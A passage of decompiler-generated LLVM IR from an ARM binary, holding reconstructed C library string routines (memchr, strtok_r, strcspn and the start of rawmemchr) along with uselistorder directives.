  uselistorder i32 %v2_16e74, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_16e74, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_16e84, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16e68, { 0, 2, 1 }
  uselistorder i32 %v13_16e64, { 1, 0 }
  uselistorder i32 %v4_16e60, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_16e60, { 2, 0, 1 }
  uselistorder i32 %v6_16e68, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16e58, { 0, 2, 1 }
  uselistorder i32 %v16_16e54, { 1, 0 }
  uselistorder i32 %v4_16e50, { 1, 2, 0 }
  uselistorder i32 %v0_16e60.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_16e58, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16e44, { 0, 3, 2, 1 }
  uselistorder i32 %v10_16e40, { 1, 0 }
  uselistorder i32 %v1_16e3c, { 1, 0 }
  uselistorder i32 %v10_16e38, { 1, 0 }
  uselistorder i32 %v0_16e38, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16e3c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_16e30, { 0, 2, 1 }
  uselistorder i32 %v2_16e24, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_16e24, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_16e3c36, { 1, 2, 0 }
  uselistorder i32 %v1_16e1c, { 2, 1, 0 }
  uselistorder i32 %v1_16e14, { 2, 3, 1, 0 }
  uselistorder i32 %v2_16e0c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_16e08, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_16e04, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_16e04, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_16df4, { 0, 2, 1 }
  uselistorder i32 %v4_16df0, { 1, 0 }
  uselistorder i32 %v3_16de4, { 1, 0 }
  uselistorder i32 %v1_16ddc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16dd0, { 1, 0 }
  uselistorder i32 %v12_16dcc, { 0, 2, 1 }
  uselistorder i32 %v8_16dac, { 1, 0, 2 }
  uselistorder i32 %v5_16dac, { 1, 0, 2 }
  uselistorder i32 %v2_16dac, { 1, 0, 2 }
  uselistorder i32 %v0_16dac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16dcc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16d88, { 0, 2, 1 }
  uselistorder i32 %v4_16d84, { 1, 0 }
  uselistorder i32 %v3_16d78, { 1, 0 }
  uselistorder i32 %v1_16d70, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16d64, { 1, 0 }
  uselistorder i32 %v12_16d60, { 0, 2, 1 }
  uselistorder i32 %v8_16d40, { 1, 0, 2 }
  uselistorder i32 %v5_16d40, { 1, 0, 2 }
  uselistorder i32 %v2_16d40, { 1, 0, 2 }
  uselistorder i32 %v0_16d40, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16d60, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16d1c, { 0, 2, 1 }
  uselistorder i32 %v4_16d18, { 1, 0 }
  uselistorder i32 %v3_16d0c, { 1, 0 }
  uselistorder i32 %v1_16d04, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16cf8, { 1, 0 }
  uselistorder i32 %v12_16cf4, { 0, 2, 1 }
  uselistorder i32 %v8_16cd4, { 1, 0, 2 }
  uselistorder i32 %v5_16cd4, { 1, 0, 2 }
  uselistorder i32 %v2_16cd4, { 1, 0, 2 }
  uselistorder i32 %v0_16cd4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16cf4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_16d30, { 0, 2, 1 }
  uselistorder i32 %v1_16d2c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16cb0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_16cb0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16d34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_16dcc75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_16ca4, { 1, 0 }
  uselistorder i32 %v0_16ca4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_16c9c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_16c9c, { 1, 0, 2 }
  uselistorder i32 %v0_16c9c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16dcc76, { 1, 0 }
  uselistorder i32 %v1_16c7c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_16c84, { 1, 0 }
  uselistorder i32 %v0_16c58, { 3, 0, 1, 2 }
  uselistorder i32 %v1_16c4c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_16c38, { 1, 0, 2 }
  uselistorder i32 %v1_16c34, { 1, 0 }
  uselistorder i32 %v1_16c2c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_16c2c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16c24, { 0, 2, 1 }
  uselistorder i32 %v3_16c24, { 3, 0, 1, 2 }
  uselistorder i1 %v0_16c24, { 1, 0 }
  uselistorder i1 %v1_16c24, { 1, 0 }
  uselistorder i32 %v3_16c20, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16c18, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16c04, { 1, 2, 0 }
  uselistorder i32 %v1_16bfc, { 0, 2, 1 }
  uselistorder i32 %v12_16bf8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16bec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16bf0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_16be0, { 0, 2, 1 }
  uselistorder i32 %v1_16bd8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16bd8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_16bd0, { 1, 0 }
  uselistorder i32 %v1_16bc8, { 2, 1, 0 }
  uselistorder i32 %v2_16bc0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16bc0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_16bbc, { 1, 0 }
  uselistorder i32 %v2_16bb0, { 1, 0 }
  uselistorder i32 %v1_16bb0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_16bb0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 77, 4, 6, 8, 10, 7, 78, 9, 11, 13, 75, 12, 79, 74, 76, 80, 83, 81, 87, 88, 14, 15, 16, 18, 17, 19, 20, 82, 21, 22, 84, 23, 85, 24, 86, 25, 26, 27, 28, 29, 31, 33, 30, 45, 32, 34, 36, 38, 35, 46, 37, 39, 41, 43, 40, 47, 42, 44, 48, 49, 54, 50, 52, 51, 53, 55, 58, 56, 59, 57, 60, 61, 67, 62, 63, 68, 64, 69, 65, 70, 66, 71, 72, 73, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 56, 3, 4, 57, 5, 6, 58, 7, 55, 61, 62, 8, 9, 21, 10, 12, 11, 13, 14, 59, 15, 16, 60, 17, 18, 19, 20, 22, 23, 31, 24, 25, 32, 26, 27, 33, 28, 29, 34, 30, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 50, 51, 45, 46, 47, 52, 48, 49, 53, 54, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 2, 23, 0, 24, 1, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 2, 25, 0, 26, 1, 28, 27, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17020, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16fb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16f48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16ee8, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_16e74, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_16e38, { 1, 0 }
  uselistorder label %dec_label_pc_16e24, { 1, 0 }
  uselistorder label %dec_label_pc_16de4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16d78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16d0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16cac, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_16c7c, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_16c18, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_16bd8, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_17044 = urem i32 %arg1, 256
  %v0_17060.pr = load i32, i32* @r2, align 4
  %v2_1706015 = icmp eq i32 %v0_17060.pr, 0
  %v0_17074.pre = load i32, i32* @r0, align 4
  br i1 %v2_1706015, label %dec_label_pc_17070, label %dec_label_pc_17068

dec_label_pc_1704c:                               ; preds = %dec_label_pc_17068
  %v1_1704c = inttoptr i32 %v0_1705c to i8*
  %v2_1704c = load i8, i8* %v1_1704c, align 1
  %v3_1704c = zext i8 %v2_1704c to i32
  %v9_17050 = icmp eq i32 %v3_1704c, %v1_17044
  br i1 %v9_17050, label %dec_label_pc_17120, label %dec_label_pc_17058

dec_label_pc_17058:                               ; preds = %dec_label_pc_1704c
  %v1_17058 = add i32 %v0_17058, -1
  %v1_1705c = add i32 %v0_1705c, 1
  %v2_17060 = icmp eq i32 %v1_17058, 0
  br i1 %v2_17060, label %dec_label_pc_17070, label %dec_label_pc_17068

dec_label_pc_17068:                               ; preds = %entry, %dec_label_pc_17058
  %v0_17058 = phi i32 [ %v1_17058, %dec_label_pc_17058 ], [ %v0_17060.pr, %entry ]
  %v0_1705c = phi i32 [ %v1_1705c, %dec_label_pc_17058 ], [ %v0_17074.pre, %entry ]
  %v1_17068 = urem i32 %v0_1705c, 4
  %v2_17068 = icmp eq i32 %v1_17068, 0
  br i1 %v2_17068, label %dec_label_pc_17070, label %dec_label_pc_1704c

dec_label_pc_17070:                               ; preds = %dec_label_pc_17058, %dec_label_pc_17068, %entry
  %v0_170ec22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_17058 ], [ %v0_17058, %dec_label_pc_17068 ]
  %v0_17074 = phi i32 [ %v0_17074.pre, %entry ], [ %v1_1705c, %dec_label_pc_17058 ], [ %v0_1705c, %dec_label_pc_17068 ]
  %v4_17070 = mul nuw nsw i32 %v1_17044, 256
  %v5_17070 = or i32 %v4_17070, %v1_17044
  %v4_17078 = mul i32 %v5_17070, 65536
  %v5_17078 = or i32 %v4_17078, %v5_17070
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_170ec22, 3
  br i1 %tmp, label %dec_label_pc_17080, label %dec_label_pc_17114.preheader

dec_label_pc_17080:                               ; preds = %dec_label_pc_17070, %dec_label_pc_170ec.backedge
  %v0_1709c60 = phi i32 [ %v1_1709c, %dec_label_pc_170ec.backedge ], [ %v0_170ec22, %dec_label_pc_17070 ]
  %v0_170c059 = phi i32 [ %v4_17080, %dec_label_pc_170ec.backedge ], [ %v0_17074, %dec_label_pc_17070 ]
  %v1_17080 = inttoptr i32 %v0_170c059 to i32*
  %v2_17080 = load i32, i32* %v1_17080, align 4
  %v4_17080 = add i32 %v0_170c059, 4
  %v2_17084 = xor i32 %v2_17080, %v5_17078
  %v2_17088 = add i32 %v2_17084, 2130640639
  %v1_1708c = sub i32 -1, %v2_17084
  %v2_17090 = xor i32 %v2_17088, %v1_1708c
  %v2_17094 = and i32 %v2_17090, -2130640640
  %v2_17098 = icmp eq i32 %v2_17094, 0
  %v1_1709c = add i32 %v0_1709c60, -4
  br i1 %v2_17098, label %dec_label_pc_170ec.backedge, label %dec_label_pc_170a4

dec_label_pc_170ec.backedge:                      ; preds = %dec_label_pc_17080, %dec_label_pc_170dc
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1709c, 3
  br i1 %tmp73, label %dec_label_pc_17080, label %dec_label_pc_17114.preheader

dec_label_pc_170a4:                               ; preds = %dec_label_pc_17080
  %v2_170a4 = inttoptr i32 %v0_170c059 to i8*
  %v3_170a4 = load i8, i8* %v2_170a4, align 1
  %v4_170a4 = zext i8 %v3_170a4 to i32
  %v9_170ac = icmp eq i32 %v4_170a4, %v1_17044
  %v1_170b0 = add i32 %v0_170c059, 3
  store i32 %v1_170b0, i32* @ip, align 4
  br i1 %v9_170ac, label %dec_label_pc_17120, label %dec_label_pc_170b8

dec_label_pc_170b8:                               ; preds = %dec_label_pc_170a4
  %v1_170b8 = add i32 %v0_170c059, 1
  %v2_170b8 = inttoptr i32 %v1_170b8 to i8*
  %v3_170b8 = load i8, i8* %v2_170b8, align 1
  %v4_170b8 = zext i8 %v3_170b8 to i32
  %v9_170bc = icmp eq i32 %v4_170b8, %v1_17044
  br i1 %v9_170bc, label %bb, label %dec_label_pc_170cc

bb:                                               ; preds = %dec_label_pc_170b8
  br label %dec_label_pc_17120

dec_label_pc_170cc:                               ; preds = %dec_label_pc_170b8
  %v1_170cc = add i32 %v0_170c059, 2
  %v2_170cc = inttoptr i32 %v1_170cc to i8*
  %v3_170cc = load i8, i8* %v2_170cc, align 1
  %v4_170cc = zext i8 %v3_170cc to i32
  %v9_170d0 = icmp eq i32 %v4_170cc, %v1_17044
  br i1 %v9_170d0, label %dec_label_pc_17120, label %dec_label_pc_170dc

dec_label_pc_170dc:                               ; preds = %dec_label_pc_170cc
  %v2_170dc = inttoptr i32 %v1_170b0 to i8*
  %v3_170dc = load i8, i8* %v2_170dc, align 1
  %v4_170dc = zext i8 %v3_170dc to i32
  %v9_170e0 = icmp eq i32 %v4_170dc, %v1_17044
  br i1 %v9_170e0, label %bb36, label %dec_label_pc_170ec.backedge

bb36:                                             ; preds = %dec_label_pc_170dc
  br label %dec_label_pc_17120

dec_label_pc_17114.preheader:                     ; preds = %dec_label_pc_170ec.backedge, %dec_label_pc_17070
  %v0_170c0.lcssa = phi i32 [ %v0_17074, %dec_label_pc_17070 ], [ %v4_17080, %dec_label_pc_170ec.backedge ]
  %v0_1709c.lcssa = phi i32 [ %v0_170ec22, %dec_label_pc_17070 ], [ %v1_1709c, %dec_label_pc_170ec.backedge ]
  %v2_171147 = icmp eq i32 %v0_1709c.lcssa, 0
  br i1 %v2_171147, label %dec_label_pc_1711c, label %dec_label_pc_17104

dec_label_pc_17104:                               ; preds = %dec_label_pc_17110, %dec_label_pc_17114.preheader
  %v0_17114.in = phi i32 [ %v0_17114, %dec_label_pc_17110 ], [ %v0_1709c.lcssa, %dec_label_pc_17114.preheader ]
  %v0_17110 = phi i32 [ %v1_17110, %dec_label_pc_17110 ], [ %v0_170c0.lcssa, %dec_label_pc_17114.preheader ]
  %v0_17114 = add i32 %v0_17114.in, -1
  %v1_17104 = inttoptr i32 %v0_17110 to i8*
  %v2_17104 = load i8, i8* %v1_17104, align 1
  %v3_17104 = zext i8 %v2_17104 to i32
  %v9_17108 = icmp eq i32 %v3_17104, %v1_17044
  br i1 %v9_17108, label %dec_label_pc_17120, label %dec_label_pc_17110

dec_label_pc_17110:                               ; preds = %dec_label_pc_17104
  %v1_17110 = add i32 %v0_17110, 1
  %v2_17114 = icmp eq i32 %v0_17114, 0
  br i1 %v2_17114, label %dec_label_pc_1711c, label %dec_label_pc_17104

dec_label_pc_1711c:                               ; preds = %dec_label_pc_17110, %dec_label_pc_17114.preheader
  br label %dec_label_pc_17120

dec_label_pc_17120:                               ; preds = %dec_label_pc_1704c, %dec_label_pc_170cc, %dec_label_pc_170a4, %dec_label_pc_17104, %bb36, %bb, %dec_label_pc_1711c
  %v1_17124 = phi i32 [ 0, %dec_label_pc_1711c ], [ %v1_170b8, %bb ], [ %v1_170b0, %bb36 ], [ %v0_17110, %dec_label_pc_17104 ], [ %v1_170cc, %dec_label_pc_170cc ], [ %v0_170c059, %dec_label_pc_170a4 ], [ %v0_1705c, %dec_label_pc_1704c ]
  ret i32 %v1_17124

; uselistorder directives
  uselistorder i32 %v1_1709c, { 1, 0, 2 }
  uselistorder i32 %v0_170c059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_17070, { 1, 0 }
  uselistorder i32 %v0_170ec22, { 1, 2, 0 }
  uselistorder i32 %v0_1705c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_17074.pre, { 1, 0 }
  uselistorder i32 %v1_17044, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_17120, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_170ec.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17080, { 1, 0 }
  uselistorder label %dec_label_pc_17070, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17068, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17130 = load i32, i32* @r4, align 4
  store i32 %v3_17130, i32* %stack_var_-16, align 4
  %v0_17134 = load i32, i32* @r0, align 4
  store i32 %v0_17134, i32* %r4.global-to-local, align 4
  %v2_17134 = icmp eq i32 %v0_17134, 0
  %v1_17138 = load i32, i32* @r2, align 4
  br i1 %v2_17134, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_17138 = inttoptr i32 %v1_17138 to i32*
  %v3_17138 = load i32, i32* %v2_17138, align 4
  store i32 %v3_17138, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1713c = phi i32 [ %v3_17138, %bb ], [ %v0_17134, %entry ]
  store i32 %v0_1713c, i32* @r0, align 4
  store i32 %v1_17138, i32* %r5.global-to-local, align 4
  %v0_17144 = load i32, i32* @r1, align 4
  store i32 %v0_17144, i32* %r6.global-to-local, align 4
  %v1_17148 = inttoptr i32 %v0_1713c to i8*
  %v2_17148 = call i32 @__GI_strspn(i8* %v1_17148)
  %v0_1714c = load i32, i32* %r4.global-to-local, align 4
  %v2_1714c = add i32 %v0_1714c, %v2_17148
  %v3_1714c = inttoptr i32 %v2_1714c to i8*
  %v4_1714c = load i8, i8* %v3_1714c, align 1
  %v6_1714c = zext i8 %v4_1714c to i32
  store i32 %v6_1714c, i32* %r3.global-to-local, align 4
  store i32 %v2_1714c, i32* @r4, align 4
  %v2_17154 = icmp eq i8 %v4_1714c, 0
  br i1 %v2_17154, label %bb8, label %dec_label_pc_17160

bb8:                                              ; preds = %entry._crit_edge
  %v2_17158 = load i32, i32* %r5.global-to-local, align 4
  %v3_17158 = inttoptr i32 %v2_17158 to i32*
  store i32 %v2_1714c, i32* %v3_17158, align 4
  br label %dec_label_pc_1719c

dec_label_pc_17160:                               ; preds = %entry._crit_edge
  %v0_17160 = load i32, i32* %r6.global-to-local, align 4
  %v3_17168 = call i32 @__GI_strpbrk(i8* %v3_1714c, i32 %v0_17160)
  %v3_1716c = icmp eq i32 %v3_17168, 0
  br i1 %v3_1716c, label %dec_label_pc_17174, label %dec_label_pc_1718c

dec_label_pc_17174:                               ; preds = %dec_label_pc_17160
  %v0_17178 = load i32, i32* @r4, align 4
  store i32 %v0_17178, i32* @r0, align 4
  %v2_1717c = call i32 @rawmemchr(i32 %v0_17178, i32 0)
  %v0_17180 = load i32, i32* @r4, align 4
  store i32 %v0_17180, i32* %r3.global-to-local, align 4
  %v1_17184 = load i32, i32* %r5.global-to-local, align 4
  %v2_17184 = inttoptr i32 %v1_17184 to i32*
  store i32 %v2_1717c, i32* %v2_17184, align 4
  br label %dec_label_pc_1719c

dec_label_pc_1718c:                               ; preds = %dec_label_pc_17160
  %v4_17168 = inttoptr i32 %v3_17168 to i8*
  store i8 0, i8* %v4_17168, align 1
  %v7_17190 = add i32 %v3_17168, 1
  %v1_17194 = load i32, i32* %r5.global-to-local, align 4
  %v2_17194 = inttoptr i32 %v1_17194 to i32*
  store i32 %v7_17190, i32* %v2_17194, align 4
  %v0_17198 = load i32, i32* @r4, align 4
  store i32 %v0_17198, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1719c

dec_label_pc_1719c:                               ; preds = %bb8, %dec_label_pc_17174, %dec_label_pc_1718c
  %v0_1719c = load i32, i32* %r3.global-to-local, align 4
  %v2_171a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_171a0, i32* @r4, align 4
  ret i32 %v0_1719c

; uselistorder directives
  uselistorder i32 %v3_17168, { 0, 2, 1 }
  uselistorder i32 %v0_1713c, { 1, 0 }
  uselistorder i32 %v0_17134, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1719c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_171a8 = load i32, i32* @r4, align 4
  store i32 %v3_171a8, i32* %stack_var_-16, align 4
  %v6_171a8 = load i32, i32* @r5, align 4
  %v9_171a8 = load i32, i32* @r6, align 4
  %v0_171ac = load i32, i32* @r0, align 4
  %v0_171b0 = load i32, i32* @r1, align 4
  store i32 %v0_171b0, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_171cc8 = inttoptr i32 %v0_171ac to i8*
  %v2_171cc9 = load i8, i8* %v1_171cc8, align 1
  %v2_171d011 = icmp eq i8 %v2_171cc9, 0
  store i32 %v0_171b0, i32* @r0, align 4
  %v1_171d812 = add i32 %v0_171ac, 1
  store i32 %v1_171d812, i32* @r4, align 4
  br i1 %v2_171d011, label %dec_label_pc_171e0, label %dec_label_pc_171bc

dec_label_pc_171bc:                               ; preds = %entry, %dec_label_pc_171c8
  %v3_171cc14.in = phi i8 [ %v2_171cc, %dec_label_pc_171c8 ], [ %v2_171cc9, %entry ]
  %v0_171d413 = phi i32 [ %v0_171d4.pre, %dec_label_pc_171c8 ], [ %v0_171b0, %entry ]
  %v3_171cc14 = zext i8 %v3_171cc14.in to i32
  %v2_171bc = call i32 @__GI_strchr(i32 %v0_171d413, i32 %v3_171cc14)
  %v2_171c0 = icmp eq i32 %v2_171bc, 0
  %v0_171c8 = load i32, i32* @r5, align 4
  br i1 %v2_171c0, label %dec_label_pc_171c8, label %dec_label_pc_171e0

dec_label_pc_171c8:                               ; preds = %dec_label_pc_171bc
  %v1_171c8 = add i32 %v0_171c8, 1
  %v0_171cc.pre = load i32, i32* @r4, align 4
  %v0_171d4.pre = load i32, i32* @r6, align 4
  store i32 %v1_171c8, i32* @r5, align 4
  %v1_171cc = inttoptr i32 %v0_171cc.pre to i8*
  %v2_171cc = load i8, i8* %v1_171cc, align 1
  %v2_171d0 = icmp eq i8 %v2_171cc, 0
  store i32 %v0_171d4.pre, i32* @r0, align 4
  %v1_171d8 = add i32 %v0_171cc.pre, 1
  store i32 %v1_171d8, i32* @r4, align 4
  br i1 %v2_171d0, label %dec_label_pc_171e0, label %dec_label_pc_171bc

dec_label_pc_171e0:                               ; preds = %dec_label_pc_171c8, %dec_label_pc_171bc, %entry
  %v0_171e0 = phi i32 [ 0, %entry ], [ %v0_171c8, %dec_label_pc_171bc ], [ %v1_171c8, %dec_label_pc_171c8 ]
  %v2_171e4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_171e4, i32* @r4, align 4
  store i32 %v6_171a8, i32* @r5, align 4
  store i32 %v9_171a8, i32* @r6, align 4
  ret i32 %v0_171e0

; uselistorder directives
  uselistorder i8 %v2_171cc, { 1, 0 }
  uselistorder i32 %v0_171d4.pre, { 1, 0 }
  uselistorder i32 %v0_171cc.pre, { 1, 0 }
  uselistorder label %dec_label_pc_171bc, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_171f0 = urem i32 %arg1, 256
  %v0_172082 = load i32, i32* @r0, align 4
  %v1_172083 = urem i32 %v0_172082, 4
  %v2_172084 = icmp eq i32 %v1_172083, 0
  br i1 %v2_172084, label %dec_label_pc_17210, label %dec_label_pc_171f8

dec_label_pc_171f8:                               ; preds = %entry, %dec_label_pc_17204
  %v0_17204 = phi i32 [ %v1_17204, %dec_label_pc_17204 ], [ %v0_172082, %entry ]
  %v1_171f8 = inttoptr i32 %v0_17204 to i8*
  %v2_171f8 = load i8, i8* %v1_171f8, align 1
  %v3_171f8 = zext i8 %v2_171f8 to i32
  %v9_171fc = icmp eq i32 %v3_171f8, %v1_171f0
  br i1 %v9_171fc, label %dec_label_pc_1728c, label %dec_label_pc_17204

dec_label_pc_17204:                               ; preds = %dec_label_pc_171f8
  %v1_17204 = add i32 %v0_17204, 1
  %v1_17208 = urem i32 %v1_17204, 4
  %v2_17208 = icmp eq i32 %v1_17208, 0
  br i1 %v2_17208, label %dec_label_pc_17210, label %dec_label_pc_171f8

dec_label_pc_17210:                               ; preds = %dec_label_pc_17204, %entry
  %v0_17214 = phi i32 [ %v0_172082, %entry ], [ %v1_17204, %dec_label_pc_17204 ]
  %v4_17210 = mul nuw nsw i32 %v1_171f0, 256
  %v5_17210 = or i32 %v4_17210, %v1_171f0
  %v4_17218 = mul i32 %v5_17210, 65536
  %v5_17218 = or i32 %v4_17218, %v5_17210
  br label %dec_label_pc_1721c

dec_label_pc_1721c:                               ; preds = %dec_label_pc_1727c, %dec_label_pc_1721c, %dec_label_pc_17210
  %v0_17260 = phi i32 [ %v0_17214, %dec_label_pc_17210 ], [ %v4_1721c, %dec_label_pc_1721c ], [ %v4_1721c, %dec_label_pc_1727c ]
  %v1_1721c = inttoptr i32 %v0_17260 to i32*
  %v2_1721c = load i32, i32* %v1_1721c, align 4
  %v4_1721c = add i32 %v0_17260, 4
  %v2_17224 = xor i32 %v2_1721c, %v5_17218
  %v2_17228 = add i32 %v2_17224, 2130640639
  %v1_17230 = sub i32 -1, %v2_17224
  %v2_17234 = xor i32 %v2_17228, %v1_17230
  %v2_17238 = and i32 %v2_17234, -2130640640
  %v2_1723c = icmp eq i32 %v2_17238, 0
  br i1 %v2_1723c, label %dec_label_pc_1721c, label %dec_label_pc_17244

dec_label_pc_17244:                               ; preds = %dec_label_pc_1721c
  %v2_17244 = inttoptr i32 %v0_17260 to i8*
  %v3_17244 = load i8, i8* %v2_17244, align 1
  %v4_17244 = zext i8 %v3_17244 to i32
  %v9_1724c = icmp eq i32 %v4_17244, %v1_171f0
  %v1_17250 = add i32 %v0_17260, 3
